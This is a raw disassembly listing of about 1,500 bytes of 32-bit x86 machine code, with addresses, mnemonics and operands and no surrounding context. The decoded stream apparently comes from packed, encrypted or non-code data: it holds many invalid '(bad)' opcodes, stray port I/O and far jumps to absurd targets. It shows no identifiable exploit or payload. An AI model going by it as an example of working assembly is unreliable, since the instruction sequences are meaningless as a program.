  412f0d:	jno    0x412f0f
  412f0f:	aad    0xc
  412f11:	sub    bl,BYTE PTR [edi]
  412f13:	adc    dh,cl
  412f15:	pop    si
  412f17:	mov    ds,ebx
  412f19:	mov    eax,ds:0x9eed3f21
  412f1e:	sub    ah,ah
  412f20:	dec    ebp
  412f21:	mov    edx,0xbfae8b0a
  412f26:	aad    0x81
  412f28:	mov    bh,0x9c
  412f2a:	inc    ebp
  412f2b:	pusha  
  412f2c:	mov    bh,0x15
  412f2e:	in     al,0xd8
  412f30:	repnz (bad) 
  412f32:	jl     0x412f0a
  412f34:	push   0xe4e2fbbb
  412f39:	out    0x28,al
  412f3b:	fild   WORD PTR [ebx-0x3f676ae6]
  412f41:	fdivp  st(1),st
  412f43:	enter  0xc013,0xeb
  412f47:	gs mov eax,0xd448006a
  412f4d:	mov    esi,0xc8b80b0b
  412f52:	out    0x5a,eax
  412f54:	icebp  
  412f55:	stos   BYTE PTR es:[di],al
  412f57:	push   cs
  412f58:	mov    dh,0xd2
  412f5a:	inc    ebx
  412f5b:	shl    cl,0x41
  412f5e:	imul   DWORD PTR [edx-0x3f]
  412f61:	cmp    edx,DWORD PTR [edi]
  412f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f64:	inc    edx
  412f65:	adc    DWORD PTR [edx],esi
  412f67:	jl     0x412f81
  412f69:	xchg   ecx,eax
  412f6a:	pop    esp
  412f6b:	fwait
  412f6c:	add    DWORD PTR [ebp-0x786d2a37],eax
  412f72:	shl    DWORD PTR [esi-0x5b],0xfb
  412f76:	mov    dl,0x53
  412f78:	enter  0xa45e,0x76
  412f7c:	mov    gs,WORD PTR [eax-0x53]
  412f7f:	nop
  412f80:	call   0xa10de857
  412f85:	pop    ecx
  412f86:	daa    
  412f87:	lds    ebx,FWORD PTR [ebx]
  412f89:	loop   0x412fd9
  412f8b:	loopne 0x412fe8
  412f8d:	push   eax
  412f8e:	or     ebp,DWORD PTR [ebx+0x75]
  412f91:	inc    ebp
  412f92:	lods   eax,DWORD PTR ds:[esi]
  412f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f94:	mov    ch,0x9d
  412f96:	ds clc 
  412f98:	loopne 0x412f61
  412f9a:	mov    bh,0xec
  412f9c:	imul   ebp,DWORD PTR [ecx-0x56415975],0xffffff91
  412fa3:	push   esi
  412fa4:	sub    BYTE PTR [edi+0x3a],bh
  412fa7:	pop    edi
  412fa8:	(bad)  
  412fa9:	hlt    
  412faa:	mov    al,0x23
  412fac:	retf   
  412fad:	gs ds mov esp,0x8545dfc1
  412fb4:	mov    DWORD PTR [ecx],ebp
  412fb6:	push   edx
  412fb7:	xor    eax,0x32fb14d2
  412fbc:	enter  0x30c1,0xce
  412fc0:	or     BYTE PTR [ecx],dh
  412fc2:	pop    esp
  412fc3:	popa   
  412fc4:	dec    ebp
  412fc5:	cmc    
  412fc6:	stc    
  412fc7:	or     al,al
  412fc9:	xor    ebx,DWORD PTR [eax-0x6c]
  412fcc:	and    ch,BYTE PTR [ebx-0x74d1463f]
  412fd2:	push   esp
  412fd3:	add    al,0x26
  412fd5:	(bad)  
  412fd6:	dec    ebp
  412fd7:	sbb    al,0xd6
  412fd9:	pop    eax
  412fda:	ror    edi,1
  412fdc:	and    BYTE PTR [esi-0x49063af],cl
  412fe2:	shl    BYTE PTR [ebp-0x3bf9ee70],0x83
  412fe9:	rcl    BYTE PTR ss:[ecx+0x7aec0d80],0x4b
  412ff1:	les    eax,FWORD PTR [ebx+0x679cf530]
  412ff7:	lds    edx,FWORD PTR [ebx-0x7e]
  412ffa:	cs sub esp,0x6152d133
  413001:	mov    eax,0x306e5e0c
  413006:	icebp  
  413007:	or     eax,0xd84dc23c
  41300c:	and    al,0x48
  41300e:	jae    0x10f52df0
  413014:	push   ecx
  413015:	mov    edi,0xcd5bacfb
  41301a:	mov    eax,ds:0x83b4bac8
  41301f:	push   ecx
  413020:	push   es
  413021:	or     edi,DWORD PTR [esi]
  413023:	addr16 div edi
  413026:	fst    DWORD PTR [ebx+ebx*8-0x23]
  41302a:	scas   al,BYTE PTR es:[edi]
  41302b:	inc    esp
  41302c:	mov    fs,WORD PTR [edi+ebp*2+0x382497c1]
  413033:	pusha  
  413034:	or     esi,DWORD PTR [edx]
  413036:	imul   ecx,DWORD PTR [ecx-0x40],0x8
  41303a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41303b:	mov    DWORD PTR [ebx],ebp
  41303d:	mov    ch,0xab
  41303f:	and    DWORD PTR [edx+ebp*1+0x7297fe5e],0xc0969db
  41304a:	mov    esp,0xc32f6738
  41304f:	call   0x5c8c7343
  413054:	mov    edi,0xcedbc94e
  413059:	push   cs
  41305a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41305b:	push   cs
  41305c:	aas    
  41305d:	aaa    
  41305e:	push   edx
  41305f:	into   
  413060:	jno    0x4130bd
  413062:	mov    DWORD PTR [ebp+0x8],ecx
  413065:	test   DWORD PTR [eax-0x3643bbe5],ebp
  41306b:	mov    ah,0x4e
  41306d:	or     eax,0x613da7b4
  413072:	sbb    eax,0xecce02e6
  413077:	es in  eax,dx
  413079:	dec    esi
  41307a:	imul   BYTE PTR [edi+0x409dbebb]
  413080:	in     al,dx
  413081:	xchg   ebx,eax
  413082:	add    bl,BYTE PTR [eax-0x2fb58c76]
  413088:	mov    al,ds:0xffd463
  41308d:	jb     0x4130de
  41308f:	dec    edi
  413090:	aas    
  413091:	fldenv [eax]
  413093:	sti    
  413094:	scas   al,BYTE PTR es:[edi]
  413095:	enter  0xf376,0x6e
  413099:	push   ss
  41309a:	fadd   QWORD PTR [ecx+edi*8+0x76]
  41309e:	das    
  41309f:	push   ds
  4130a0:	xor    ch,BYTE PTR [ebp+0x3c]
  4130a3:	das    
  4130a4:	icebp  
  4130a5:	out    0xa5,eax
  4130a7:	ja     0x4130b4
  4130a9:	push   ebx
  4130aa:	stos   BYTE PTR es:[edi],al
  4130ab:	repz jl 0x413126
  4130ae:	punpckhwd mm4,QWORD PTR [eax-0x589df3bb]
  4130b5:	dec    ebx
  4130b6:	mov    eax,0x6b1f22b0
  4130bb:	clc    
  4130bc:	dec    ebx
  4130bd:	inc    ecx
  4130be:	and    BYTE PTR [edi+0x1c],0x96
  4130c2:	xor    dl,BYTE PTR [ecx-0x10]
  4130c5:	push   ss
  4130c6:	mov    bh,0x4d
  4130c8:	fiadd  DWORD PTR ds:0xd7c0efeb
  4130ce:	stc    
  4130cf:	xchg   ebx,ebx
  4130d1:	or     DWORD PTR [ebp+0x5a],edx
  4130d4:	dec    edi
  4130d5:	mov    bh,0x27
  4130d7:	ror    DWORD PTR [edi],1
  4130d9:	test   eax,0xb94e38f9
  4130de:	push   eax
  4130df:	mov    ch,0xa2
  4130e1:	pop    edx
  4130e2:	adc    DWORD PTR [ecx+0x5b],esi
  4130e5:	es icebp 
  4130e7:	lock pop edi
  4130e9:	adc    BYTE PTR [esp+edx*2+0x2b87331f],0x7e
  4130f1:	mov    edi,0x2cd0a855
  4130f6:	mov    eax,0x600ec4cf
  4130fb:	pop    eax
  4130fc:	jecxz  0x4130bd
  4130fe:	aam    0x6f
  413100:	lock aaa 
  413102:	add    ecx,DWORD PTR [esi+esi*2+0x12]
  413106:	and    al,0xa3
  413108:	(bad)  
  41310a:	xlat   BYTE PTR ds:[ebx]
  41310b:	mov    bl,0xf2
  41310d:	in     eax,0xed
  41310f:	xchg   esp,eax
  413110:	pop    es
  413111:	mov    dl,0x50
  413113:	adc    edi,0xffe0713e
  413119:	fst    st(5)
  41311b:	jmp    0x459:0x3aee4303
  413122:	lods   eax,DWORD PTR ds:[esi]
  413123:	pop    edi
  413124:	cld    
  413125:	push   cs
  413126:	fcomp  QWORD PTR [eax-0x28c43fb9]
  41312d:	aas    
  41312e:	loopne 0x4131a7
  413130:	xlat   BYTE PTR ds:[ebx]
  413131:	ins    BYTE PTR es:[edi],dx
  413132:	or     cl,BYTE PTR [esp+ecx*8+0x7]
  413136:	mov    esi,0x7a2b636e
  41313b:	arpl   WORD PTR [ebp+0x431055f2],si
  413141:	cmc    
  413142:	sbb    esp,DWORD PTR [ecx]
  413144:	xor    BYTE PTR ds:0x44925576,0xdd
  41314b:	sbb    cl,bh
  41314d:	loopne 0x413164
  41314f:	ins    BYTE PTR es:[edi],dx
  413150:	pop    edx
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	daa    
  413153:	add    eax,0xd628c5a6
  413158:	in     al,dx
  413159:	cld    
  41315a:	mov    ds:0xe7f65b02,al
  41315f:	cwde   
  413160:	jmp    DWORD PTR es:[eax]
  413163:	or     edi,DWORD PTR [edi]
  413165:	and    esi,DWORD PTR [eax-0x282c30fd]
  41316b:	push   ebx
  41316c:	(bad)  
  41316d:	mov    cl,0x46
  41316f:	call   0x9236:0x42493487
  413176:	mov    cl,0xc6
  413178:	sub    eax,0x8c27609e
  41317d:	sti    
  41317e:	inc    esi
  41317f:	jo     0x413149
  413181:	(bad)  
  413182:	push   edi
  413183:	sbb    BYTE PTR [ebx+edx*1+0x15],0xa5
  413188:	inc    ecx
  413189:	psubw  mm2,QWORD PTR [esp+ebx*2-0x61]
  41318e:	(bad)  
  41318f:	jno    0x413111
  413191:	pop    ebx
  413192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413193:	clc    
  413194:	mov    al,0x7c
  413196:	or     ebp,DWORD PTR [esi-0x3e]
  413199:	pop    ds
  41319a:	xchg   esp,eax
  41319b:	push   ebx
  41319c:	jp     0x4131f9
  41319e:	mov    ds:0xd246ae42,al
  4131a3:	enter  0xd39f,0xdf
  4131a7:	ror    BYTE PTR ds:0xd2735566,1
  4131ad:	cmp    BYTE PTR [edi-0x3bc42f98],0x4f
  4131b4:	pusha  
  4131b5:	push   esp
  4131b6:	lock leave 
  4131b8:	fidiv  DWORD PTR [esi-0x39]
  4131bb:	(bad)  
  4131bc:	xor    DWORD PTR [esi-0x7ea1b228],ecx
  4131c2:	or     WORD PTR ds:0xf241e5eb,0xff8b
  4131ca:	leave  
  4131cb:	daa    
  4131cc:	std    
  4131cd:	and    BYTE PTR [edx],bh
  4131cf:	push   ds
  4131d0:	add    BYTE PTR [edx+esi*2+0x17],ah
  4131d4:	int3   
  4131d5:	cwde   
  4131d6:	push   ebx
  4131d7:	adc    DWORD PTR [ebx],edi
  4131d9:	pop    ebp
  4131da:	sar    ch,0x7c
  4131dd:	pop    ds
  4131de:	and    bl,ah
  4131e0:	push   ecx
  4131e1:	rcr    BYTE PTR [ebx-0x6b8f2e1a],1
  4131e7:	cmp    eax,0x9d75237d
  4131ec:	sub    BYTE PTR [ecx],dh
  4131ee:	cdq    
  4131ef:	(bad)  
  4131f0:	std    
  4131f1:	add    BYTE PTR [edx-0x7],ch
  4131f4:	fimul  DWORD PTR [ebp-0x7775495]
  4131fa:	ds aas 
  4131fc:	hlt    
  4131fd:	dec    edx
  4131fe:	xchg   esi,eax
  4131ff:	pop    esi
  413200:	das    
  413201:	imul   esp,DWORD PTR [edi+edx*2-0x77876c2f],0x48d59b5b
  41320c:	mov    edi,0x65e94a7b
  413211:	inc    ecx
  413212:	das    
  413213:	push   ebp
  413214:	scas   al,BYTE PTR es:[edi]
  413215:	cmp    eax,0x82c59e0e
  41321a:	sub    al,0x54
  41321c:	mov    DWORD PTR [edi+0x23],edi
  41321f:	adc    ebp,DWORD PTR [edx+0x3e50e80d]
  413225:	mov    cl,0xfd
  413227:	add    eax,0xac8cd6a2
  41322c:	pop    esp
  41322d:	jge    0x4131ca
  41322f:	sub    eax,edi
  413231:	xchg   ebp,ebp
  413233:	(bad)  
  413234:	mov    dl,0x47
  413236:	jl     0x413285
  413238:	inc    esi
  413239:	push   ebx
  41323a:	mov    eax,DWORD PTR [ebp-0x2]
  41323d:	icebp  
  41323e:	cmp    eax,esi
  413240:	stos   BYTE PTR es:[edi],al
  413241:	xchg   edx,eax
  413242:	in     al,dx
  413243:	mov    ecx,0x9547ad14
  413248:	pop    edx
  413249:	sbb    eax,DWORD PTR [ebp-0x8d48bfe]
  41324f:	test   al,0x3a
  413251:	mov    eax,DWORD PTR [edi]
  413253:	inc    esp
  413254:	arpl   WORD PTR [ecx+0xb],si
  413257:	dec    edx
  413258:	push   ss
  413259:	clc    
  41325a:	cmp    edi,ecx
  41325c:	mov    al,0xcc
  41325e:	sbb    eax,0xf707d3f7
  413263:	xor    eax,DWORD PTR [ebp+0x234d55c2]
  413269:	add    ecx,0xffffffa6
  41326c:	and    dx,ax
  41326f:	test   DWORD PTR [edx],0x1e482d46
  413275:	fs cmp dh,cl
  413278:	pop    es
  413279:	xor    eax,ecx
  41327b:	fistp  WORD PTR [ebx]
  41327d:	and    BYTE PTR [edi-0x546a3c2c],ch
  413283:	jmp    0x4c90bc27
  413288:	mov    bl,ch
  41328a:	ds out dx,al
  41328c:	jecxz  0x41329a
  41328e:	aad    0xe6
  413290:	jb     0x4132a3
  413292:	fbld   TBYTE PTR [edi*2+0x3cba574a]
  413299:	mov    esp,DWORD PTR [ebx]
  41329b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41329c:	loopne 0x4132b4
  41329e:	shl    BYTE PTR [edi+0x14],cl
  4132a1:	add    bh,dh
  4132a3:	pop    ebp
  4132a4:	retf   0xf09e
  4132a7:	pop    eax
  4132a8:	dec    esp
  4132a9:	sbb    BYTE PTR [eax+edx*2],ch
  4132ac:	pushf  
  4132ad:	xchg   ah,cl
  4132af:	cmp    eax,ebx
  4132b1:	fadd   st(6),st
  4132b3:	and    eax,0x97758240
  4132b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132b9:	sub    BYTE PTR [ebx+0x5d],ch
  4132bc:	loopne 0x4132bc
  4132be:	js     0x4132d0
  4132c0:	and    ebx,ecx
  4132c2:	loop   0x41331e
  4132c4:	or     DWORD PTR [edx],0x13f251e8
  4132ca:	call   0x73f6:0x1bef0275
  4132d1:	sahf   
  4132d2:	jae    0x413281
  4132d4:	(bad)  
  4132d6:	in     al,0x8
  4132d8:	sbb    BYTE PTR [ecx+0x6],dl
  4132db:	cdq    
  4132dc:	push   esi
  4132dd:	mov    ds:0xc06ad1a7,eax
  4132e2:	jno    0x4132af
  4132e4:	push   esi
  4132e5:	xor    DWORD PTR [esi],0x45
  4132e8:	lahf   
  4132e9:	ins    DWORD PTR es:[edi],dx
  4132ea:	cmp    DWORD PTR [esi-0x15],0x70
  4132ee:	aam    0x13
  4132f0:	adc    eax,0xdaca4e0b
  4132f5:	(bad)  
  4132f6:	mov    esi,0x8bd218bf
  4132fb:	xor    al,0xb5
  4132fd:	sub    BYTE PTR [ebx+0x394df5fa],dl
  413303:	sbb    BYTE PTR [ebx-0x618d5a3c],ch
  413309:	mov    ds:0x4027a0d1,eax
  41330e:	cmp    ebx,DWORD PTR [ecx+0x3f]
  413311:	and    DWORD PTR [ebx],edx
  413313:	retf   
  413314:	(bad)  
  413315:	fcomp  QWORD PTR ds:0x6e84e8bb
  41331b:	and    DWORD PTR [ebx],eax
  41331d:	rcl    ecx,1
  41331f:	lds    esp,FWORD PTR [ecx-0x8]
  413322:	pop    edx
  413323:	push   edi
  413324:	pop    edi
  413325:	push   es
  413326:	adc    BYTE PTR [ebp-0x4516c7ce],ch
  41332c:	jae    0x41333a
  41332e:	push   0x4be3ec76
  413333:	sti    
  413334:	cdq    
  413335:	xor    eax,0x36ba55a0
  41333a:	test   ebp,esp
  41333c:	mov    dl,0xb0
  41333e:	cmp    ecx,esp
  413340:	stc    
  413341:	pop    esp
  413342:	ds cwde 
  413344:	and    eax,0x4811c479
  413349:	xchg   ecx,eax
  41334a:	(bad)  
  41334b:	jp     0x413378
  41334d:	jnp    0x413326
  41334f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413350:	mov    al,ds:0xd1f79a14
  413355:	pushf  
  413356:	pop    esi
  413357:	push   ecx
  413358:	dec    edx
  413359:	xor    al,0x8b
  41335b:	outs   dx,BYTE PTR ds:[esi]
  41335c:	retf   
  41335d:	test   cl,dh
  41335f:	mov    al,ds:0x8d215f77
  413364:	rol    BYTE PTR [ebp+0x3e8e7a26],1
  41336a:	loopne 0x4132fb
  41336c:	in     al,dx
  41336d:	lock mov cs,WORD PTR [edx+0x36]
  413371:	xor    al,0xb2
  413373:	mov    DWORD PTR [edi],ebp
  413375:	sti    
  413376:	test   eax,0xaa041c0e
  41337b:	clc    
  41337c:	into   
  41337d:	xchg   edi,eax
  41337e:	sbb    eax,0x248905d6
  413383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413384:	xor    BYTE PTR [esi+eiz*4-0x47626cc2],dh
  41338b:	inc    esp
  41338c:	sub    esi,edx
  41338e:	mov    ecx,0xc04a4583
  413393:	mov    es,WORD PTR cs:[ecx+0x23]
  413397:	sbb    esp,DWORD PTR [ecx]
  413399:	pop    ebx
  41339a:	add    eax,0x68b8e40e
  41339f:	mov    dl,0x13
  4133a1:	or     DWORD PTR [eax+0xd],ebp
  4133a4:	pusha  
  4133a5:	or     DWORD PTR [ebx+0x32],edi
  4133a8:	sbb    dh,bh
  4133aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ab:	(bad)  
  4133ac:	pop    ecx
  4133ad:	out    0x7d,al
  4133af:	push   ss
  4133b0:	pop    edx
  4133b1:	mov    edi,edi
  4133b3:	push   edi
  4133b4:	dec    ecx
  4133b5:	or     eax,0xc949e64d
  4133ba:	add    ebp,DWORD PTR [ebp*8-0x1754eab4]
  4133c1:	ficom  WORD PTR [eax+0x5cdb1bce]
  4133c7:	pop    edx
  4133c8:	aad    0x53
  4133ca:	lods   al,BYTE PTR ds:[esi]
  4133cb:	push   es
  4133cc:	sti    
  4133cd:	mov    eax,ds:0xfd4dae86
  4133d2:	push   0xffffffbc
  4133d4:	sbb    al,0x25
  4133d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133d7:	add    esi,eax
  4133d9:	adc    al,0x2
  4133db:	jle    0x4133a2
  4133dd:	aad    0x9b
  4133df:	js     0x4133f0
  4133e1:	sti    
  4133e2:	adc    ebx,ebx
  4133e4:	mov    dh,0xa1
  4133e6:	pop    ebx
  4133e7:	ins    DWORD PTR es:[edi],dx
  4133e8:	inc    ecx
  4133e9:	ficomp WORD PTR [esi]
  4133eb:	call   0x6a28:0x463dbbc8
  4133f2:	fsubp  st(3),st
  4133f4:	lock mov ds:0xc529cbaf,eax
  4133fa:	jo     0x4133f5
  4133fc:	rcr    bp,cl
  4133ff:	rol    DWORD PTR [ecx],0xd2
  413402:	es in  al,0xe9
  413405:	les    eax,FWORD PTR [ecx+0x27818290]
  41340b:	cmp    BYTE PTR [bx+di+0x28],al
  41340f:	rcl    DWORD PTR [esi],0x7e
  413412:	imul   BYTE PTR [ecx-0x77]
  413415:	sbb    al,0x5f
  413417:	sti    
  413418:	mov    ebp,0xfefb167d
  41341d:	icebp  
  41341e:	cmp    eax,0x526bb8e8
  413423:	adc    DWORD PTR [ecx+0x13],esp
  413426:	in     al,0x22
  413428:	imul   edi,DWORD PTR [ebp+ecx*4-0x12a8c68],0x5
  413430:	icebp  
  413431:	xor    edx,0x30
  413434:	xlat   BYTE PTR ds:[ebx]
  413435:	fild   WORD PTR [ecx-0x4ecdb7a7]
  41343b:	lods   al,BYTE PTR ds:[esi]
  41343c:	xchg   esi,eax
  41343d:	in     al,0x3a
  41343f:	sub    BYTE PTR [edi-0x62],ah
  413442:	das    
  413443:	rcr    cl,0xf7
  413446:	fwait
  413447:	imul   ecx,eax,0xffffffb7
  41344a:	sti    
  41344b:	cmp    al,0x36
  41344d:	sbb    BYTE PTR [ecx+0x2f33ec29],dh
  413453:	sbb    BYTE PTR [ebp-0x3557b8a8],al
  413459:	xchg   ebx,eax
  41345a:	jnp    0x41349a
  41345c:	add    al,0xc2
  41345e:	and    DWORD PTR [ebp-0x72],0x18
  413462:	js     0x413476
  413464:	int3   
  413465:	and    eax,0xe856d6ee
  41346a:	cld    
  41346b:	cmp    edx,ecx
  41346d:	and    al,0xdd
  41346f:	repnz pushf 
  413471:	sbb    al,0x6f
  413473:	les    ebx,FWORD PTR [ecx+eax*2]
  413476:	stos   DWORD PTR es:[edi],eax
  413477:	pop    esp
  413478:	daa    
  413479:	cmp    eax,0x85911b9b
  41347e:	lahf   
  41347f:	shr    edx,1
  413481:	pop    ebx
  413482:	and    BYTE PTR [edx+ebx*2-0x2f],ah
  413486:	out    dx,eax
  413487:	and    dl,al
  413489:	push   esp
  41348a:	dec    eax
  41348b:	cld    
  41348c:	sti    
  41348d:	(bad)  
  41348e:	sbb    BYTE PTR [ecx+0x60de8ada],ch
  413494:	xor    al,0x51
  413496:	mov    ah,0xd9
  413498:	sub    cl,BYTE PTR [edi-0x33d0cf6f]
  41349e:	push   esp
  4134a0:	aam    0xa9
  4134a2:	je     0x413512
  4134a4:	xchg   edi,eax
  4134a5:	(bad)  
  4134a6:	adc    bh,ah
  4134a8:	test   ch,ah
  4134aa:	mov    ds:0x9dc39be7,al
  4134af:	rol    BYTE PTR [eax-0x65],0x5c
  4134b3:	mov    ch,0x45
  4134b5:	outs   dx,DWORD PTR ds:[esi]
  4134b6:	test   ch,dh
  4134b8:	aam    0xf
  4134ba:	mov    ah,0xd
  4134bc:	xchg   DWORD PTR [edx+eax*2],edi
  4134bf:	push   edi
  4134c0:	repz imul edi,DWORD PTR [edi-0x3044ae05],0xffffffb5
  4134c8:	jmp    0x4134a3
  4134ca:	add    DWORD PTR [ebx+ecx*1],ecx
  4134cd:	repnz aam 0x8b
  4134d0:	dec    eax
  4134d1:	stos   BYTE PTR es:[edi],al
  4134d2:	stc    
  4134d3:	sub    eax,edi
  4134d5:	dec    ebx
  4134d6:	lahf   
  4134d7:	enter  0xdc09,0x2
  4134db:	pop    ebx
  4134dc:	aam    0xe5
  4134de:	ins    BYTE PTR es:[edi],dx
  4134df:	hlt    
  4134e0:	ror    BYTE PTR [ebp-0x9],0x24
  4134e4:	sub    BYTE PTR [edi+0x70],0x91
  4134e8:	xchg   DWORD PTR [ebx],edx
  4134ea:	shl    DWORD PTR [eax],cl
  4134ec:	inc    edx
  4134ed:	adc    dl,bl
  4134ef:	popa   
  4134f0:	popa   
  4134f1:	fwait
  4134f2:	loope  0x41347c
  4134f4:	pop    ecx
  4134f5:	mov    esi,0x20710824
  4134fa:	scas   al,BYTE PTR es:[edi]
  4134fb:	jp     0x41353e
  4134fd:	mov    ch,0x23
  4134ff:	xor    al,0xea
  413501:	lds    edx,FWORD PTR [ecx]
  413503:	mov    edx,0xfb25b024
  413508:	test   DWORD PTR [ebp+0x7118eec],edi
  41350e:	cld    
  41350f:	xchg   esi,eax
  413510:	sub    bh,0x1f
  413513:	xchg   dh,dl
  413515:	mov    ?,WORD PTR [eax+0x3a]
  413518:	test   eax,0x8989ef5a
  41351d:	cmp    BYTE PTR [eax-0x65],0xfa
  413521:	xor    al,0xa1
  413523:	mov    al,0x6b
  413525:	leave  
  413526:	jle    0x41351d
  413528:	pop    ebx
  413529:	dec    esp
  41352a:	lahf   
  41352b:	scas   al,BYTE PTR es:[edi]
  41352c:	sub    BYTE PTR [esi+0x8],bh
  41352f:	pop    eax
  413530:	and    al,0xca
  413532:	mov    edi,ebp
  413534:	rcr    BYTE PTR [ecx-0x38],cl
  413537:	fst    QWORD PTR [esi+0x33]
  41353a:	mov    bh,0x71
  41353c:	mov    edi,0x6d5717da
  413541:	jp     0x413517
  413543:	scas   al,BYTE PTR es:[edi]
  413544:	sahf   
  413545:	and    ebp,esi
  413547:	adc    DWORD PTR ds:0xc6dda7a3,edx
  41354d:	jmp    0x413561
  41354f:	mov    esp,DWORD PTR [ecx]
  413551:	nop
  413552:	repnz outs dx,BYTE PTR ds:[esi]
  413554:	adc    eax,0x11545edc
  413559:	(bad)  
  41355a:	xor    dl,BYTE PTR [ecx-0x2]
  41355d:	shl    ch,0x59
  413560:	jb     0x413582
  413562:	xor    al,BYTE PTR [ebp-0xd]
  413565:	jg     0x41351c
  413567:	je     0x4134ff
  413569:	sbb    cl,BYTE PTR [edx]
  41356b:	dec    eax
  41356c:	mov    esi,0xf07402d2
  413571:	add    al,0xb5
  413573:	ja     0x41356b
  413575:	xor    eax,0x74b1500c
  41357a:	repnz push edx
  41357c:	mov    ebp,0xa6e2f9f7
  413581:	push   ebp
  413582:	adc    ebx,edx
  413584:	push   edx
  413585:	hlt    
  413586:	push   eax
  413587:	cmp    DWORD PTR [edi+0xbf6c81],0x46
  41358e:	popa   
  41358f:	popf   
  413590:	jae    0x413532
  413592:	fcomp  QWORD PTR [ecx]
  413594:	mov    esi,0xe4597377
  413599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41359a:	lahf   
  41359b:	dec    esp
  41359c:	push   ds
  41359d:	and    DWORD PTR [edi+0x5df5580a],edx
  4135a3:	call   0x74e584b8
  4135a8:	repnz data16 xor ch,BYTE PTR [edx]
  4135ac:	call   0xaae1:0xc36a2343
  4135b3:	mov    ss,ebp
  4135b5:	jo     0x413636
  4135b7:	xchg   ebx,eax
  4135b8:	enter  0xcd8d,0x5b
  4135bc:	add    DWORD PTR [esi-0x69378efd],ebx
  4135c2:	mov    DWORD PTR [edi],ebp
  4135c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	enter  0x53e6,0xeb
  4135ca:	push   edx
  4135cb:	push   ebx
  4135cc:	pop    ds
  4135cd:	xor    DWORD PTR [edx-0x244c6aa9],edx
  4135d3:	nop
  4135d4:	mov    ch,0xcc
  4135d6:	aam    0xc6
  4135d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135d9:	addr16 xchg ebx,eax
  4135db:	dec    esi
  4135dc:	xor    eax,0x5e8a3d84
  4135e1:	jb     0x413649
  4135e3:	mov    ds:0xa1f7b2de,eax
  4135e8:	mov    ecx,ebx
  4135ea:	nop
  4135eb:	jg     0x41362d
  4135ed:	es xchg ebx,eax
  4135ef:	sbb    DWORD PTR [edx-0x54acb87f],0xd3da7249
  4135f9:	in     eax,0xcf
  4135fb:	shl    ebx,0xb3
  4135fe:	cmp    eax,0x473bfda6
  413603:	in     al,0x8
  413605:	sub    edx,DWORD PTR [esi]
  413607:	push   ebx
  413608:	in     al,0xda
  41360a:	jecxz  0x413592
  41360c:	stos   BYTE PTR es:[edi],al
  41360d:	mov    eax,0xbfc74319
  413612:	inc    eax
  413613:	sub    al,0x12
  413615:	mov    bh,0x17
  413617:	inc    ecx
  413618:	test   BYTE PTR [ebp+0x56],dl
  41361b:	dec    esp
  41361c:	xchg   edi,eax
  41361d:	inc    ebp
  41361e:	mov    bh,0xdc
  413620:	ins    BYTE PTR es:[edi],dx
  413621:	add    ebx,DWORD PTR [eax+edx*8+0x67ace8df]
  413628:	or     al,0xb8
  41362a:	(bad)  
  41362b:	xchg   esp,eax
  41362c:	fdivr  QWORD PTR [ebp-0x4b8518d2]
  413632:	dec    edi
  413633:	pop    ss
  413634:	add    eax,0x119bdd33
  413639:	push   esi
  41363a:	xchg   esi,eax
  41363b:	mov    bl,0x34
  41363d:	push   ebp
  41363e:	inc    edi
  41363f:	fidivr DWORD PTR [ecx+0x4f7ec8cd]
  413645:	sti    
  413646:	dec    esi
  413647:	je     0x413614
  413649:	cmp    edx,ebp
  41364b:	mov    ss,WORD PTR [edx+edi*8-0x3]
  41364f:	fisub  DWORD PTR [esi+ecx*2+0x6d]
  413653:	or     eax,0xcb3c88f0
  413658:	pusha  
  413659:	jnp    0x413609
  41365b:	test   ebx,0x1d843d1d
  413661:	sbb    cl,BYTE PTR [edx+0x7c9e0a5a]
  413667:	outs   dx,DWORD PTR ds:[esi]
  413668:	push   edx
  413669:	pusha  
  41366a:	pushf  
  41366b:	(bad)  
  41366d:	out    0xbc,eax
  41366f:	retf   
  413670:	dec    eax
  413671:	jns    0x4136cc
  413673:	and    al,0xd1
  413675:	fldcw  WORD PTR [ebp-0x69f024f8]
  41367b:	fistp  WORD PTR [edi]
  41367d:	idiv   BYTE PTR [esi]
  41367f:	push   edi
  413680:	adc    DWORD PTR [eax+0x11],edi
  413683:	mov    bh,0x45
  413685:	addr16 pop es
  413687:	add    eax,0xb2096e3a
  41368c:	xor    al,0x3c
  41368e:	xchg   DWORD PTR [edx-0x3d8685c4],ebp
  413694:	xchg   ebp,eax
  413695:	cdq    
  413696:	in     al,dx
  413697:	cld    
  413698:	add    ch,al
  41369a:	jne    0x413709
  41369c:	sbb    DWORD PTR ds:[eax-0x8],eax
  4136a0:	mov    bh,0x84
  4136a2:	xor    BYTE PTR [esi+0x2],bl
  4136a5:	gs ret 
  4136a7:	inc    edx
  4136a8:	ins    BYTE PTR es:[edi],dx
  4136a9:	add    BYTE PTR ds:0xc490b0cb,bl
  4136af:	ja     0x413720
  4136b1:	push   esi
  4136b2:	dec    eax
  4136b3:	cmp    DWORD PTR [ebx-0x54],edi
  4136b6:	inc    edx
  4136b7:	cmp    BYTE PTR [edi],dh
  4136b9:	mov    WORD PTR [ebx-0x6b],fs
  4136bc:	mov    DWORD PTR [eax],0x64ba75c5
  4136c2:	jmp    0x2222:0x3931398e
  4136c9:	sub    eax,0x1e46b63c
  4136ce:	lahf   
  4136cf:	mov    eax,ds:0x1007f2cd
  4136d4:	adc    DWORD PTR [eax+0x9],ebp
  4136d7:	ins    BYTE PTR es:[edi],dx
  4136d8:	mov    dl,0x49
  4136da:	ror    BYTE PTR [edx],0xd8
  4136dd:	sub    al,0x79
  4136df:	mov    esp,0xe90c5669
  4136e4:	jmp    0x49e1:0x8c0edcc3
